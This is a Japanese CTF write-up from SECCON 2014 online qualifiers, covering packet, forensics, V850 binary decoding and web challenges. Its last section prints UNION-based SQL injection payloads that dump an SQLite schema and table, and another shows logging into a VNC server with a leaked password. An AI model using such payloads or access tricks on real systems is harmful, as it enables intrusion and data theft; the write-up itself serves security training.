---
date: '2014-07-23T19:57:23+09:00'
title: 'SECCON 2014 オンライン予選 (日本語) writeup'
categories:
 - CTF
 - writeup
tags:
 - SECCON
---

0x0として参加しました。\
予選2位通過

{{<image classes="fancybox" src="/assets/seccon-2014-online-japanese-quals-writeup/457b016a7d87f547798e78390869ca63.png" title="問題一覧">}}\
※上のスクリーンショットを撮った後に@nolzeがPrint it!を解いている

<!--more-->

## このパケットを解析せよ (ネットワーク 100pt)

FTP通信のキャプチャ
flag.txtにbase64エンコードされたflagが書かれている

Flag: FLAG{F7P 15 N07 53CUR3}

## ソーシャルハック？(ネットワーク 300pt)

画像ファイルのURLを渡すとそこにアクセスしてくる。(デフォルトのポート以外ではダメ)

    153.120.82.112 - - [19/Jul/2014:15:26:05 +0900] "HEAD **/img.jpg HTTP/1.1" 404 204 "-" "MyVNCpasswordIsVNCpass123"

\

    PORT STATE SERVICE
    5901/tcp open vnc-1
    5902/tcp open vnc-2
    5903/tcp open vnc-3

接続元でVNCサーバーが動いているのでVNC viewer で接続するとflagが出てくる

{{<image classes="fancybox" src="/assets/seccon-2014-online-japanese-quals-writeup/754939e70eef9b6b679707877bb1a2c2.png" title="flag">}}

## 879,394 bytes (フォレンジック 100pt)

あからさまにVFATなのだ!

{{<image classes="fancybox" src="/assets/seccon-2014-online-japanese-quals-writeup/699f28ab44efadad50453450be6c4208.png" title="ディレクトリエントリのダンプ">}}

ファイルサイズが879,394 bytesなエントリのファイル名がflag

Flag: Chrysanthemum.jpg

## 捏造された契約書を暴け (フォレンジック 300pt)\

    ある会社からSECCONが守秘義務に違反しているとの警告文書が届きました。しかし、SECCON はその会社とは過去に一切の取引がなく、そのような守秘義務契約書を結んだ記録はありません。

    相手方の会社は「原本は紙だったが、不慮の事故により消失してしまった。しかし、念のためTiffイメージとして電子化し保存しておいたデータがある」、という契約書の電子データ（Tiff画像）に含まれている印影などを元に、この守秘義務契約書が 2012年1月1日に締結されたも有効な文書であると主張しています。

    電子データが容易に改ざん可能であることから、このTiff画像が保存されていたボリュームはフォレンジックツールを使い、ディスク全体のフルディスクイメージが、RAW形式（DDイメージ）にて保全されました。

    その後、情報システム部門がこのイメージファイルを調べたところ、確かにTiff画像ファイルのタイムスタンプなどは、エクスプローラー上から確認する範囲では 2011年1月1日付けになっていたそうです。しかし、情報システム部門では、このTiff画像などがねつ造されたものである事を示す手がかりを見つけることができなかった為、あなたに調査の依頼がされました。

    このイメージファイルを解析し、この契約書が 2012年1月1日以降に作成された事を示す、タイムラインに矛盾が発生する証拠を探し出し、その日時を答えてください。

    なお、回答は YYYY/MM/DD HH:MM:SS の形式で記入してください。 

autopsyでMFTエントリを探し、Tiff画像の元ファイル C:/機密保持契約書.docxを復元する。\
印鑑画像のExifの日付が答え。

$ unzip vol1-meta39.docx\
$ stirling word/media/image2.jpeg\
{{<image classes="fancybox" src="/assets/seccon-2014-online-japanese-quals-writeup/e68cc65205fec8cf6290832229c4c61b.png" title="image2.jpegのダンプ">}}

Flag: 2012/05/23 13:29:00

## ダンプを追え！ (バイナリ 300pt)

メモリダンプ dump.bin と シンボル情報 encrypt.nm
が問題文に添付されている。

$ strings dump.binAj,YV850 binaryflag.txtdump.bin
$ cat encrypt.nm

    00001400 T _start
    00001400 T _stext
    0000141a T ___r_exit
    00001422 T ___r_read
    0000142a T ___r_write
    00001432 T ___r_open
    0000143a T ___r_close
    00001442 T _sys_exit
    00001452 T _sys_read
    00001472 T _sys_write
    00001492 T _sys_open
    000014b2 T _sys_close
    000014cc T _init
    000014ea T _read_data
    00001546 T _proc
    000015a0 T _main
    00001616 A _gp
    00001616 T _etext
    00001616 t Letext
    00001638 D _id
    0000163c B _sbss
    0000163c D _edata
    0000167c B _ebss
    00001780 A _end
    00001780 B _estack

メモリダンプ中に "V850 binary"という文字列があるので、NEC V850のバイナリであることが分かる。

$ all-objdump -D -b binary -m v850 --adjust-vma 0x1400 dump.bin

でメモリダンプを逆アセンブルして メモリマップと突き合わせながら読む

    f = open("dump.bin", "rb")
    f.seek(0x163c - 0x1400)
    e = f.read(64)

    def decode(initial):
        d = []
        r12 = initial
        for ch in e:
            b = ord(ch)
            d.append((b ^ r12) & 0xff)
            r12 += r12
            r12 += 17
            r12 &= 0xff
        print "".join([chr(b) for b in d])

    for i in range(256):
        decode(i)
\

    ...v)�tory850}�����������������������������������������������
    FLAG{Victory850}�����������������������������������������������
    EJMk6��tory850}�����������������������������������������������
    ...

## 箱庭SQLiチャレンジ (Web 100pt)

単純なSQL Injection。DBエンジンはsqlite3

{{<image classes="fancybox" src="/assets/seccon-2014-online-japanese-quals-writeup/268fd9f4247c0775f45135095fe03465.png" title="スクリーンショット">}}

やるだけ

    ' AND 1=0 union select name,NULL,NULL,NULL,NULL from sqlite_master --' AND 1=0 union select *,NULL,NULL,NULL,NULL from seccon --
